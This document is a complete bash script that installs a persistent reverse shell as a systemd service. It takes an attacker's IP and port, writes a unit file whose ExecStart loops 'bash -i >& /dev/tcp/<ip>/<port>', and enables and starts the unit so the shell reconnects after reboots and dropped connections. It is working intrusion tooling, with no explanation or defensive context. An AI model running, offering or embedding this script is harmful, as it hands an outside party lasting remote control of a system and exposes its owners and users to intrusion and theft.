#!/bin/bash
# systemd_persistence.sh - Create a systemd service for a persistent reverse shell.
if [ -z "$1" ] || [ -z "$2" ]; then
   echo "Usage: $0 <attacker_ip> <attacker_port>"
   exit 1
fi

SERVICE_NAME=rev_shell.service
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME"

echo "[Unit]
Description=Persistent Reverse Shell Service

[Service]
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$1/$2 0>&1; sleep 10; done'
Restart=always

[Install]
WantedBy=multi-user.target" | sudo tee $SERVICE_FILE >/dev/null

sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME
echo "Systemd service for reverse shell created and started."
